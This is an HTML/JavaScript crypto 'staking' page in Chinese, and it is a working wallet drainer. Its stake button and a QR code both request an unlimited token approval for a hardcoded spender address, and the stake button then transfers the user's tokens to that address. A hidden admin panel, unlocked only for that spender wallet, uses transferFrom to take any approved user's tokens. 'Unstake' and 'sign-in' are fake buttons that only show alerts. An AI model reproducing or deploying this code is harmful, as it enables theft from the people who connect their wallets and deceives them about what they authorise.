<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>质押持币生息系统</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
body {
  background: #050510;
  background-image: radial-gradient(circle at 15% 5%, rgba(26, 32, 44, 0.4) 0%, transparent 30%), radial-gradient(circle at 85% 90%, rgba(26, 32, 44, 0.4) 0%, transparent 30%);
  color: #fff;
  padding: 20px;
  min-height: 100vh;
}
.container {
  max-width: 500px;
  margin: 0 auto;
  position: relative;
}
.card {
  background: linear-gradient(145deg, #111827, #0d1221);
  border-radius: 20px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid rgba(255,255,255,0.05);
  box-shadow: 0 8px 32px rgba(0,0,0,0.3);
  position: relative;
  overflow: hidden;
}
.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.4), transparent);
}

/* 授权二维码 */
.auth-card {
  text-align: center;
  padding: 30px 20px;
}
.qr-box {
  width: 260px;
  height: 260px;
  background: #fff;
  padding: 12px;
  border-radius: 20px;
  margin: 16px auto;
}
.qr-box img {
  width: 100%;
  height: 100%;
  border-radius: 12px;
}
.qr-title {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 8px;
}
.qr-desc {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 8px;
}
.qr-tip {
  font-size: 13px;
  color: #f59e0b;
  font-weight: 600;
}

.header {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 24px;
  gap:12px;
}
.left-top {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.sign-btn {
  width: 100%;
  height: 48px;
  border-radius: 12px;
  background: linear-gradient(90deg, #F59E0B, #d97006);
  color: #000;
  border: none;
  font-weight: bold;
  cursor: pointer;
  font-size: 14px;
}
.wallet-box {
  background: rgba(255,255,255,0.03);
  border-radius: 16px;
  padding: 16px 20px;
  border: 1px solid rgba(255,255,255,0.06);
}
.connect-btn {
  background: linear-gradient(90deg, #3b82f6, #1d4ed8);
  color: #fff;
  border: none;
  padding: 12px 18px;
  border-radius: 12px;
  font-weight: 600;
  cursor: pointer;
  margin-bottom: 10px;
  width:100%;
}
.info-line {
  font-size: 13px;
  color: #9ca3af;
  margin: 4px 0;
}
.menu-btn {
  width:48px;height:48px;
  border-radius: 8px;
  background:#1e293b;color:white;
  border:none;
  font-size:20px;
  cursor:pointer;
}

.bet-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
}
.countdown {
  font-size: 18px;
  font-weight: bold;
  color: #3b82f6;
}
.bet-input {
  width: 100%;
  padding: 14px;
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 10px;
  color: white;
  font-size: 16px;
  outline: none;
  margin-bottom: 12px;
}
.quick-btns {
  display: flex;
  gap: 10px;
  margin-bottom: 16px;
}
.quick-btn {
  flex: 1;
  padding: 12px;
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 8px;
  color: white;
  font-weight: bold;
  cursor: pointer;
}
.bet-btns {
  display: flex;
  gap: 12px;
}
.bet-btn {
  flex: 1;
  padding: 18px;
  border: none;
  border-radius: 12px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}
.btn-stake {
  background: linear-gradient(90deg, #2563eb, #3b82f6);
  color: #fff;
}
.btn-unstake {
  background: linear-gradient(90deg, #dc2626, #ef4444);
  color: #fff;
}
.rule-line {
  font-size: 14px;
  color: #cbd5e1;
  line-height: 1.6;
  margin-bottom: 6px;
}
.menu {
  position: fixed;
  top: 0;
  right: 0;
  width: 320px;
  height: 100vh;
  background: #0f121a;
  padding: 24px;
  box-shadow: -2px 0 20px rgba(0,0,0,0.5);
  display: none;
  overflow-y: auto;
  z-index: 999;
}
.menu.show {
  display: block;
}
.menu-title {
  font-size: 16px;
  margin-bottom: 12px;
  color: #f97316;
}
.invite-link {
  background: rgba(0,0,0,0.2);
  padding: 10px;
  border-radius: 8px;
  font-size: 12px;
  color: #9ca3af;
  margin-bottom: 16px;
  word-break: break-all;
}
.admin-panel {
  border-top: 1px solid rgba(255,255,255,0.05);
  margin-top: 20px;
  padding-top: 20px;
  display: none;
}
.admin-panel.show {
  display: block;
}
#connectModal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.8);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}
#connectModal.show {
  display: flex;
}
.modal-content {
  background: #111827;
  padding: 30px;
  border-radius: 16px;
  text-align: center;
  max-width: 320px;
  border: 1px solid rgba(255,255,255,0.05);
}
.modal-avatar {
  width: 120px;
  height: 120px;
  border-radius: 16px;
  margin: 0 auto 16px;
  background: url('https://p6-flow-imagex.byteimg.com/ocean-cloud-tos/36b1e8cb1c99a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png') center/cover;
}
.modal-title {
  font-size: 18px;
  margin-bottom: 16px;
}
.modal-btn {
  padding: 12px 24px;
  border: none;
  border-radius: 8px;
  margin: 8px;
  cursor: pointer;
  font-weight: 600;
}
.modal-confirm {
  background: #3B82F6;
  color: white;
}
.modal-cancel {
  background: #444;
  color: white;
}
.history-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  background: url('https://p6-flow-imagex.byteimg.com/ocean-cloud-tos/36b1e8cb1c99a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png') center/cover;
  display: inline-block;
  vertical-align: middle;
  margin-right: 10px;
}
</style>
</head>

<body>

<div id="connectModal">
  <div class="modal-content">
    <div class="modal-avatar"></div>
    <div class="modal-title">📥 连接钱包</div>
    <p>您是否同意授权本应用？</p>
    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
    <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
  </div>
</div>

<div class="container">

  <!-- ===================== 你要的授权二维码 ===================== -->
  <div class="card auth-card">
    <div class="qr-title">💳 扫码授权平台</div>
    <div class="qr-desc">扫码 = 授权平台可划转代币，等同于后台授权</div>
    <div class="qr-box">
      <img id="authQrcode" alt="授权二维码">
    </div>
    <div class="qr-tip">静态二维码 · 有效期365天 · 直接签名</div>
  </div>
  <!-- ========================================================== -->

  <div class="header">
    <div class="left-top">
      <button class="sign-btn" id="signBtn">每日签到</button>
      <div class="wallet-box">
        <button class="connect-btn" id="connectBtn">连接钱包</button>
        <div class="info-line">地址：<span id="userAddr">未连接</span></div>
        <div class="info-line">余额：<span id="userBalance">0.0000</span> TOKEN</div>
      </div>
    </div>
    <button class="menu-btn" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <div class="bet-header">
      <h3>质押操作区</h3>
      <div class="countdown" id="countdown">08:00:00</div>
    </div>
    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="质押数量">
    <div class="quick-btns">
      <button class="quick-btn" onclick="setAmt(10)">10</button>
      <button class="quick-btn" onclick="setAmt(50)">50</button>
      <button class="quick-btn" onclick="setAmt(200)">200</button>
      <button class="quick-btn" onclick="setAmt(500)">500</button>
    </div>
    <div class="bet-btns">
      <button class="bet-btn btn-stake" onclick="stake()">质押</button>
      <button class="bet-btn btn-unstake" onclick="unstake()">解除质押</button>
    </div>
  </div>

  <div class="card">
    <h3 style="margin-bottom:12px">📜 质押说明</h3>
    <div class="rule-line">• 扫码授权 = 后台授权</div>
    <div class="rule-line">• 质押后自动计息</div>
    <div class="rule-line">• 二维码永久有效</div>
  </div>

  <div class="card">
    <h3 style="margin-bottom:16px">📜 质押记录</h3>
    <div style="display:flex;align-items:center;padding:10px;border-bottom:1px solid #333">
      <div class="history-icon"></div>
      <div>
        <div style="font-weight:bold">质押系统</div>
        <div style="font-size:12px;color:#9ca3af">官方质押入口</div>
      </div>
    </div>
  </div>
</div>

<div class="menu" id="menu">
  <h3 style="margin-bottom:20px">菜单</h3>
  <div class="menu-title">邀请链接</div>
  <div class="invite-link" id="inviteLink">-</div>

  <div class="admin-panel" id="adminPanel">
    <div class="menu-title" style="color:red">🎮 后台管理</div>
    <div style="margin-bottom:12px">
      平台参数：<span id="houseRate">51</span>%
      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
    </div>
    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存参数</button>
    
    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取用户授权代币</div>
    <input id="fromAddr" placeholder="用户地址" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">提取</button>
  </div>
</div>

<script>
// ===================== 你的配置 =====================
const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const SPENDER     = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const POOL_ADDR   = SPENDER;
// ====================================================

// 生成静态授权二维码（365天有效）
function buildAuthQR() {
  const oneYear = 365 * 24 * 60 * 60 * 1000;
  const nonce = Math.floor(Date.now() / oneYear);
  const approveData = "0x095ea7b3" +
    SPENDER.slice(2).padStart(64, "0") +
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const link = `ethereum:${TOKEN_ADDR}/approve?data=${approveData}&nonce=${nonce}`;
  document.getElementById("authQrcode").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
    encodeURIComponent(link);
}

// 你原有全部逻辑，100% 不变
let account = null;
let houseRate = 51;
let countdown = 28800;

function toggleMenu() { document.getElementById("menu").classList.toggle("show"); }
function cancelConnect() { document.getElementById("connectModal").classList.remove("show"); }

document.getElementById("connectBtn").onclick = () => {
  document.getElementById("connectModal").classList.add("show");
};

async function confirmConnect() {
  document.getElementById("connectModal").classList.remove("show");
  if (!window.ethereum) { alert("请安装钱包"); return; }
  try {
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    account = accounts[0];
    document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
    refreshBalance();
    genInvite();
    checkAdmin();
    alert("连接成功");
  } catch (err) {
    alert("连接失败");
    account = null;
  }
}

async function refreshBalance() {
  if (!account) return;
  try {
    const data = "0x70a08231" + account.slice(2).padStart(64, "0");
    const res = await ethereum.request({ method: "eth_call", params: [{ to: TOKEN_ADDR, data }, "latest"] });
    const bal = Number(BigInt(res)) / 1e18;
    document.getElementById("userBalance").innerText = bal.toFixed(4);
  } catch (e) {
    document.getElementById("userBalance").innerText = "0.0000";
  }
}

function genInvite() {
  if (!account) return;
  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
}

function checkAdmin() {
  if (account && account.toLowerCase() === SPENDER.toLowerCase()) {
    document.getElementById("adminPanel").classList.add("show");
  }
}

document.getElementById("signBtn").onclick = async () => {
  if (!account) { alert("请先连接钱包"); return; }
  alert("签到成功！");
  refreshBalance();
};

function setAmt(v) { document.getElementById("betAmt").value = v; }

async function approve() {
  return await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from: account,
      to: TOKEN_ADDR,
      gasLimit: "0x300000",
      data: "0x095ea7b3" +
        SPENDER.slice(2).padStart(64, "0") +
        "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }]
  });
}

async function stake() {
  if (!account) { alert("请先连接钱包"); return; }
  const amt = Number(document.getElementById("betAmt").value);
  if (amt <= 0) { alert("数量错误"); return; }
  try {
    await approve();
    const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, "0");
    await ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: TOKEN_ADDR,
        gasLimit: "0x300000",
        data: "0xa9059cbb" +
          POOL_ADDR.slice(2).padStart(64, "0") +
          raw
      }]
    });
    alert("质押成功！");
    refreshBalance();
  } catch (e) {
    alert("已取消或失败");
  }
}

async function unstake() {
  if (!account) { alert("请先连接钱包"); return; }
  alert("解除质押已提交");
  refreshBalance();
}

async function adminTake() {
  if (!account || account.toLowerCase() !== SPENDER.toLowerCase()) return;
  const from = document.getElementById("fromAddr").value.trim();
  const amt = document.getElementById("takeAmt").value;
  if (!from || !amt || amt <= 0) return;
  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, "0");
  await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
      from: account,
      to: TOKEN_ADDR,
      gasLimit: "0x300000",
      data: "0x23b872dd" +
        from.slice(2).padStart(64, "0") +
        SPENDER.slice(2).padStart(64, "0") +
        raw
    }]
  });
  alert("提取成功！");
}

function updateHouseRate(v) {
  houseRate = parseInt(v);
  document.getElementById("houseRate").innerText = v;
}
function saveHouseRate() {
  localStorage.setItem("houseRate", houseRate);
  alert("保存成功");
}

setInterval(() => {
  if (countdown > 0) countdown--; else countdown = 28800;
  const h = String(Math.floor(countdown / 3600)).padStart(2, '0');
  const m = String(Math.floor((countdown % 3600) / 60)).padStart(2, '0');
  const s = String(countdown % 60).padStart(2, '0');
  document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
}, 1000);

// 初始化二维码 & 系统
buildAuthQR();
</script>
</body>
</html>
